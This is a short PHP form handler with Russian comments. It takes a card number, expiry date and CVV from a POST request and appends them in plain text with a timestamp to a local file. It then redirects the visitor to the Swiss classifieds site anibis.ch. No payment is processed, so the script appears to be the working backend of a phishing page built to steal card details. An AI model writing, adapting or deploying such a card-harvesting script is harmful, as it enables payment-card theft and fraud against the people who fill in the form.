<?php
// process.php

// Обработка данных формы
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumber = trim($_POST['cardNumber']);
    $expiryDate = trim($_POST['expiryDate']);
    $cvv = trim($_POST['cvv']);

    // Получаем текущее время
    $currentTime = date('Y-m-d H:i:s'); // Формат: ГГГГ-ММ-ДД ЧЧ:ММ:СС

    // Открываем файл для записи, добавляем данные
    $fp = fopen('data.txt', 'a');
    if ($fp === false) {
        die('Не удалось открыть файл для записи.');
    }

    // Записываем данные в файл
    fwrite($fp, "Время записи: {$currentTime}\n");
    fwrite($fp, "Номер карты: {$cardNumber}\n");
    fwrite($fp, "Срок действия (MM/YY): {$expiryDate}\n");
    fwrite($fp, "CVV: {$cvv}\n");
    fwrite($fp, "---------\n");

    // Закрываем файл
    fclose($fp);

    // Задержка на 5 секунд перед редиректом
    sleep(5);

    // Редирект на другую страницу после обработки
    header('Location: https://www.anibis.ch/fr');
    exit;
}
?>